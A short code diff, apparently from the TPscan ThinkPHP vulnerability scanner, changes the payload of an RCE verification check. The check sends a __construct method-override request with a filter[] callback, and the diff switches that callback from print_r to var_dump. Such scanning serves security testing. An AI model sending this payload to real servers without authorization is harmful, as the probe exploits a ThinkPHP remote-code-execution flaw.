@@ -19,7 +19,7 @@ def thinkphp_index_construct_rce_verify(url):
         "User-Agent": 'TPscan',
         "Content-Type": "application/x-www-form-urlencoded",
     }
-    payload = 's=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=print_r'
+    payload = 's=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=var_dump'
     try:
         vurl = urllib.parse.urljoin(url, 'index.php?s=index/index/index')
         req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
